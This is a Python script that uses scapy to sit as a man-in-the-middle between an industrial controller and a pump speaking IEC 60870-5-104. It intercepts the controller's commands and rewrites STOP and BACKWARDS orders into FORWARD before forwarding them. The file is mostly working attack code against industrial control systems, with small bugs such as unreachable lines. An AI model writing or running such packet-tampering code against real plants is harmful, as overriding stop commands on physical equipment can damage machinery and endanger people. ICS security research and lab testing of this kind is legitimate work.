#!/usr/bin/python2

"""
    Use scapy to modify packets going through your machine.
    Based on nfqueue to block packets in the kernel and pass them to scapy for validation
"""

from scapy.all import *
import os





IP_CONTROLLER="192.168.20.10"
IP_PUMP="192.168.20.11"
MAC_CONTROLLER="00:e0:4c:36:41:8d"
MAC_PUMP="b8:27:eb:ec:7a:d0"

MY_INTERFACE = "eno1"

LENGTH_APCI=6
ASDU_TYPE_BYTE=1
ASDU_ACT_ORDER_VALUE_BYTE=9 
ASDU_ACT_ORDER_VALUE_LENGTH=2 

ASDU_TYPE_ACT_CHAR="\x31"
ASDU_ACT_ORDER_STOP_VALUE_STR="\x00\x00"
ASDU_ACT_ORDER_BACKWARDS_VALUE_STR="\x07\x00"
ASDU_ACT_ORDER_FORWARD_VALUE_STR="\xe7\x00"


def get_mac(IP):
		conf.verb = 0
		ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP),iface=MY_INTERFACE, timeout = 2, inter = 0.1)
		for snd,rcv in ans:
			return rcv.sprintf(r"%Ether.src%")


try:
	MAC_PUMP_found = get_mac(IP_CONTROLLER)
	print(MAC_PUMP_found)
except Exception:
        print ("[!] Couldn't Find Victim MAC Address")
	

def modify_stop_packet(chosen_packet):
	#get a list of bytes from the payload
	copied_packet_payload_list=list(str(chosen_packet[TCP].payload))
	print("\t before : "+"".join(copied_packet_payload_list).encode("hex"))
	#modify the 2bytes to the FORWARD value
	copied_packet_payload_list[LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE:LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE+ASDU_ACT_ORDER_VALUE_LENGTH]=ASDU_ACT_ORDER_FORWARD_VALUE_STR
	new_payload="".join(copied_packet_payload_list)
	#put the changed payload in the original packet
	chosen_packet[TCP].payload=Raw(new_payload)
	print("\t after  : "+new_payload.encode("hex"))
	#TODO : change the mac_dst address!
	
	#delete the checksum so that scapy will handle them and recalculate them
	del chosen_packet[IP].chksum 
	del chosen_packet[TCP].chksum
	#print(chosen_packet.show2())

def is_104_packet_from_controller(packet):
	if packet.haslayer(TCP) and (packet[TCP].dport ==2404) and (len (packet[TCP].payload) >0 )   :
		return True
	else:
		return False

def is_STOP_order_packet(chosen_packet):
	if( not is_104_packet_from_controller(chosen_packet)):
		return False
	payload_packet=str(chosen_packet[TCP].payload)
	asdu_type=payload_packet[LENGTH_APCI:LENGTH_APCI+ASDU_TYPE_BYTE]
	if(asdu_type == ASDU_TYPE_ACT_CHAR):
		asdu_order_value=payload_packet[LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE:LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE+ASDU_ACT_ORDER_VALUE_LENGTH]
		if(asdu_order_value == ASDU_ACT_ORDER_STOP_VALUE_STR or asdu_order_value ==ASDU_ACT_ORDER_BACKWARDS_VALUE_STR):
			return True
			modify_stop_packet(chosen_packet)

	return False





def callback_sniff(packet):
	#packet[Ether].src == MAC_CONTROLLER and
	if(packet[Ether].src == MAC_CONTROLLER and packet[IP].src==IP_CONTROLLER and packet[IP].dst==IP_PUMP):		
		#print("c->p")

		if packet.haslayer(TCP) and is_STOP_order_packet(packet):
			modify_stop_packet(packet)
#	else:
#		print("not TCP")
#		print(packet.summary())
		send(packet[IP],verbose=False)#,iface=MY_INTERFACE)#,verbose=False)



	if(packet[Ether].src == MAC_PUMP and packet[IP].src==IP_PUMP and packet[IP].dst==IP_CONTROLLER):
		#print("p->c")		
#	else:
#		print("not TCP")
#		print(packet.summary())
		send(packet[IP],verbose=False)#,iface=MY_INTERFACE)#,verbose=False)

def loop_sleep():
	while 1:
		try:
			time.sleep(1.5)
		except KeyboardInterrupt:
			break
def stop_ip_forward():
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def start_ip_forward():
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def main_sniff():
	start_ip_forward()
	print("MitM with full forward until ctrl-c")
	loop_sleep()
	print("")
	stop_ip_forward()

	print("MitM with sniffing & IEC 104 packet modification until ctrl-c")
	sniff(prn=callback_sniff,filter="ip")

	start_ip_forward()
	print("MitM with full forward until ctrl-c")
	loop_sleep()
	print("")
	stop_ip_forward()

if __name__ == "__main__":
    main_sniff()
